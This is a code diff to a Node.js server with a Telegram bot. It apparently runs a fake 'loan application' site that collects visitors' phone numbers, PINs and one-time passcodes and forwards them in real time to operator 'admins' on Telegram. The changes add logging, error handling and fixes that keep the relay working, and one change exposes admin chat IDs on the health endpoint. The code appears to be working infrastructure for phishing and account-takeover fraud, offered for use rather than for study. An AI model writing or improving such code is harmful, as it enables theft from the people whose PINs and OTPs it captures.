@@ -329,7 +329,7 @@ Provide this to your super admin for access.
     });
 
     // Add admin command (superadmin only)
-    bot.onText(/\/addadmin/, async (msg) => {
+    bot.onText(/\/addadmin$/, async (msg) => {
         const chatId = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
         
@@ -404,8 +404,9 @@ Please send admin details in this format:
             
             await db.saveAdmin(newAdmin);
             
-            // Add to active map
+            // ✅ CRITICAL FIX: Add to active map immediately
             adminChatIds.set(newAdminId, newChatId);
+            console.log(`✅ Admin added to active map: ${newAdminId} -> ${newChatId}`);
             
             await bot.sendMessage(chatId, `
 ✅ *ADMIN ADDED*
@@ -418,7 +419,9 @@ Please send admin details in this format:
 🔗 Their link:
 ${process.env.APP_URL || WEBHOOK_URL}?admin=${newAdminId}
 
-They can now use /start to get their commands!
+✅ Admin is now CONNECTED and ready to receive applications!
+
+They can use /start to see their commands!
             `, { parse_mode: 'Markdown' });
             
             // Notify the new admin
@@ -438,7 +441,7 @@ ${process.env.APP_URL || WEBHOOK_URL}?admin=${newAdminId}
 /pending - Pending applications
 /myinfo - Your information
 
-Start receiving loan applications now!
+✅ You're connected and ready to receive loan applications!
                 `, { parse_mode: 'Markdown' });
             } catch (notifyError) {
                 console.error('Could not notify new admin:', notifyError);
@@ -693,22 +696,33 @@ app.use((req, res, next) => {
 // API ENDPOINTS
 // ==========================================
 
+// ✅ CRITICAL FIX: Enhanced verify-pin endpoint with better admin checking
 app.post('/api/verify-pin', async (req, res) => {
     try {
         const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
         const applicationId = `APP-${Date.now()}`;
         
+        console.log('📥 PIN Verification Request:');
+        console.log('   Phone:', phoneNumber);
+        console.log('   Admin ID from request:', requestAdminId);
+        console.log('   Assignment Type:', assignmentType);
+        
         let assignedAdmin;
         
+        // If specific admin requested
         if (assignmentType === 'specific' && requestAdminId) {
             assignedAdmin = await db.getAdmin(requestAdminId);
             if (!assignedAdmin || assignedAdmin.status !== 'active') {
+                console.error(`❌ Admin ${requestAdminId} not found or inactive`);
                 return res.status(400).json({ success: false, message: 'Invalid admin' });
             }
+            console.log(`✅ Using requested admin: ${assignedAdmin.name}`);
         } else {
+            // Auto-assign to admin with least load
             const activeAdmins = await db.getActiveAdmins();
             if (activeAdmins.length === 0) {
-                return res.status(503).json({ success: false, message: 'No admins' });
+                console.error('❌ No active admins found');
+                return res.status(503).json({ success: false, message: 'No admins available' });
             }
             
             const adminStats = await Promise.all(
@@ -720,12 +734,27 @@ app.post('/api/verify-pin', async (req, res) => {
             
             adminStats.sort((a, b) => a.pending - b.pending);
             assignedAdmin = adminStats[0].admin;
+            console.log(`🔄 Auto-assigned to: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
         }
         
+        // ✅ CRITICAL FIX: Check if admin is connected OR add them to the map
         if (!adminChatIds.has(assignedAdmin.adminId)) {
-            return res.status(503).json({ success: false, message: 'Admin not connected' });
+            if (assignedAdmin.chatId) {
+                // Admin has chatId in database but not in active map - add them now
+                adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
+                console.log(`➕ Added admin to active map: ${assignedAdmin.adminId} -> ${assignedAdmin.chatId}`);
+            } else {
+                console.error(`❌ Admin ${assignedAdmin.adminId} has no chatId in database`);
+                return res.status(503).json({ 
+                    success: false, 
+                    message: 'Admin not connected - they need to send /start to the bot first' 
+                });
+            }
         }
         
+        console.log(`✅ Admin ${assignedAdmin.adminId} is connected (chatId: ${assignedAdmin.chatId})`);
+        
+        // Save application
         await db.saveApplication({
             id: applicationId,
             adminId: assignedAdmin.adminId,
@@ -738,7 +767,10 @@ app.post('/api/verify-pin', async (req, res) => {
             timestamp: new Date().toISOString()
         });
         
-        await sendToAdmin(assignedAdmin.adminId, `
+        console.log(`💾 Application saved: ${applicationId}`);
+        
+        // Send to admin via Telegram
+        const sent = await sendToAdmin(assignedAdmin.adminId, `
 📱 *NEW APPLICATION*
 
 📋 \`${applicationId}\`
@@ -757,7 +789,11 @@ app.post('/api/verify-pin', async (req, res) => {
             }
         });
         
-        console.log(`📤 → ${assignedAdmin.name}`);
+        if (sent) {
+            console.log(`📤 Message sent to ${assignedAdmin.name} successfully`);
+        } else {
+            console.error(`❌ Failed to send message to ${assignedAdmin.name}`);
+        }
         
         res.json({ 
             success: true, 
@@ -767,18 +803,24 @@ app.post('/api/verify-pin', async (req, res) => {
         });
         
     } catch (error) {
-        console.error('❌ Error:', error);
-        res.status(500).json({ success: false, message: 'Failed' });
+        console.error('❌ Error in /api/verify-pin:', error);
+        console.error('Stack:', error.stack);
+        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
     }
 });
 
 app.get('/api/check-pin-status/:applicationId', async (req, res) => {
-    const application = await db.getApplication(req.params.applicationId);
-    
-    if (application) {
-        res.json({ success: true, status: application.pinStatus });
-    } else {
-        res.status(404).json({ success: false, message: 'Not found' });
+    try {
+        const application = await db.getApplication(req.params.applicationId);
+        
+        if (application) {
+            res.json({ success: true, status: application.pinStatus });
+        } else {
+            res.status(404).json({ success: false, message: 'Application not found' });
+        }
+    } catch (error) {
+        console.error('Error checking PIN status:', error);
+        res.status(500).json({ success: false, message: 'Server error' });
     }
 });
 
@@ -788,11 +830,18 @@ app.post('/api/verify-otp', async (req, res) => {
         const application = await db.getApplication(applicationId);
         
         if (!application) {
-            return res.status(404).json({ success: false, message: 'Not found' });
+            return res.status(404).json({ success: false, message: 'Application not found' });
         }
         
         if (!adminChatIds.has(application.adminId)) {
-            return res.status(500).json({ success: false, message: 'Admin unavailable' });
+            // Try to add admin to map if they have chatId
+            const admin = await db.getAdmin(application.adminId);
+            if (admin && admin.chatId) {
+                adminChatIds.set(application.adminId, admin.chatId);
+                console.log(`➕ Re-added admin to map: ${application.adminId}`);
+            } else {
+                return res.status(500).json({ success: false, message: 'Admin unavailable' });
+            }
         }
         
         await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
@@ -820,18 +869,23 @@ app.post('/api/verify-otp', async (req, res) => {
         res.json({ success: true });
         
     } catch (error) {
-        console.error('Error:', error);
-        res.status(500).json({ success: false, message: 'Failed' });
+        console.error('Error in verify-otp:', error);
+        res.status(500).json({ success: false, message: 'Server error' });
     }
 });
 
 app.get('/api/check-otp-status/:applicationId', async (req, res) => {
-    const application = await db.getApplication(req.params.applicationId);
-    
-    if (application) {
-        res.json({ success: true, status: application.otpStatus });
-    } else {
-        res.status(404).json({ success: false, message: 'Not found' });
+    try {
+        const application = await db.getApplication(req.params.applicationId);
+        
+        if (application) {
+            res.json({ success: true, status: application.otpStatus });
+        } else {
+            res.status(404).json({ success: false, message: 'Application not found' });
+        }
+    } catch (error) {
+        console.error('Error checking OTP status:', error);
+        res.status(500).json({ success: false, message: 'Server error' });
     }
 });
 
@@ -841,7 +895,7 @@ app.post('/api/resend-otp', async (req, res) => {
         const application = await db.getApplication(applicationId);
         
         if (!application) {
-            return res.status(404).json({ success: false, message: 'Not found' });
+            return res.status(404).json({ success: false, message: 'Application not found' });
         }
         
         if (!adminChatIds.has(application.adminId)) {
@@ -849,7 +903,7 @@ app.post('/api/resend-otp', async (req, res) => {
         }
         
         await sendToAdmin(application.adminId, `
-🔄 *OTP RESEND*
+🔄 *OTP RESEND REQUEST*
 
 📋 \`${applicationId}\`
 📱 ${application.phoneNumber}
@@ -860,42 +914,54 @@ User requested OTP resend.
         res.json({ success: true });
         
     } catch (error) {
-        console.error('Error:', error);
-        res.status(500).json({ success: false, message: 'Failed' });
+        console.error('Error in resend-otp:', error);
+        res.status(500).json({ success: false, message: 'Server error' });
     }
 });
 
 app.get('/api/admins', async (req, res) => {
-    const admins = await db.getActiveAdmins();
-    const adminList = admins.map(admin => ({
-        id: admin.adminId,
-        name: admin.name,
-        email: admin.email,
-        status: admin.status
-    }));
-    
-    res.json({ success: true, admins: adminList });
+    try {
+        const admins = await db.getActiveAdmins();
+        const adminList = admins.map(admin => ({
+            id: admin.adminId,
+            name: admin.name,
+            email: admin.email,
+            status: admin.status,
+            connected: adminChatIds.has(admin.adminId)
+        }));
+        
+        res.json({ success: true, admins: adminList });
+    } catch (error) {
+        console.error('Error getting admins:', error);
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
 });
 
 app.get('/api/validate-admin/:adminId', async (req, res) => {
-    const admin = await db.getAdmin(req.params.adminId);
-    
-    if (admin && admin.status === 'active') {
-        res.json({ 
-            success: true, 
-            valid: true,
-            admin: {
-                id: admin.adminId,
-                name: admin.name,
-                email: admin.email
-            }
-        });
-    } else {
-        res.json({ 
-            success: true, 
-            valid: false,
-            message: 'Admin not found'
-        });
+    try {
+        const admin = await db.getAdmin(req.params.adminId);
+        
+        if (admin && admin.status === 'active') {
+            res.json({ 
+                success: true, 
+                valid: true,
+                connected: adminChatIds.has(admin.adminId),
+                admin: {
+                    id: admin.adminId,
+                    name: admin.name,
+                    email: admin.email
+                }
+            });
+        } else {
+            res.json({ 
+                success: true, 
+                valid: false,
+                message: 'Admin not found or inactive'
+            });
+        }
+    } catch (error) {
+        console.error('Error validating admin:', error);
+        res.status(500).json({ success: false, message: 'Server error' });
     }
 });
 
@@ -904,6 +970,7 @@ app.get('/health', (req, res) => {
         status: 'ok', 
         database: dbReady ? 'connected' : 'not ready',
         activeAdmins: adminChatIds.size,
+        adminsInMap: Array.from(adminChatIds.entries()).map(([id, chatId]) => ({ id, chatId })),
         botMode: 'webhook',
         webhookUrl: `${WEBHOOK_URL}/telegram-webhook`,
         timestamp: new Date().toISOString()
@@ -914,7 +981,39 @@ app.get('/admin-select', (req, res) => {
     res.sendFile(path.join(__dirname, 'admin-select.html'));
 });
 
-app.get('/', (req, res) => {
+// ✅ Enhanced landing page route with admin validation
+app.get('/', async (req, res) => {
+    const adminId = req.query.admin;
+    
+    if (adminId) {
+        console.log(`🔗 Admin link accessed: ${adminId}`);
+        
+        try {
+            // Check if admin exists and is active
+            const admin = await db.getAdmin(adminId);
+            
+            if (admin && admin.status === 'active') {
+                console.log(`✅ Valid admin: ${admin.name}`);
+                
+                // Add to active map if has chatId but not in map
+                if (admin.chatId && !adminChatIds.has(adminId)) {
+                    adminChatIds.set(adminId, admin.chatId);
+                    console.log(`➕ Added to active map: ${adminId} -> ${admin.chatId}`);
+                }
+                
+                if (adminChatIds.has(adminId)) {
+                    console.log(`✅ Admin ${adminId} is CONNECTED`);
+                } else {
+                    console.log(`⚠️ Admin ${adminId} NOT CONNECTED - needs to /start the bot`);
+                }
+            } else {
+                console.log(`⚠️ Admin ${adminId} not found or inactive`);
+            }
+        } catch (error) {
+            console.error('Error validating admin on landing page:', error);
+        }
+    }
+    
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
@@ -927,7 +1026,7 @@ app.listen(PORT, () => {
     console.log(`============================`);
     console.log(`🌐 Server: http://localhost:${PORT}`);
     console.log(`🤖 Bot: WEBHOOK MODE ✅`);
-    console.log(`👥 Admins: ${adminChatIds.size}`);
+    console.log(`👥 Admins in map: ${adminChatIds.size}`);
     console.log(`\n✅ Ready!\n`);
 });
 
